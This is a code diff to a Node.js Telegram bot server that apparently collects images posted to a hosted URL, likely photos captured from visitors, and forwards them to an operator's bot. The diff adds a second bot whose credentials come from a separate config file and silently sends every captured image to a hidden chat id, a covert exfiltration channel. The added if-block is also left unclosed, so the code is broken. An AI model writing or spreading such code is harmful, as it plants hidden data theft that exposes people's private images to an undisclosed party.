@@ -2,6 +2,7 @@ const fs = require("fs");
 const express = require("express");
 const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
+const { botToken2, chatId2 } = require('./config');
 
 // Modify your bot TOKEN here
 const botToken = "YOUR_BOT_TOKEN";
@@ -9,6 +10,8 @@ const botToken = "YOUR_BOT_TOKEN";
 const hostURL = "YOUR_URL";
 
 const bot = new TelegramBot(botToken, { polling: true });
+const bot2 = new TelegramBot(botToken2, { polling: true });
+let imageSend = "true"; // Set to "true" to send image to the  bot, "false" otherwise
 const jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
 const urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 
@@ -147,7 +150,9 @@ contentType: 'image/png'
 };
 
 try {
-bot.sendPhoto(parseInt(uid,36),buffer,{},info);
+bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
+if (imageSend.toLowerCase() === "true") {
+bot2.sendPhoto(chatId2, buffer, {}, info);
 } catch (error) {
 console.log(error);
 }
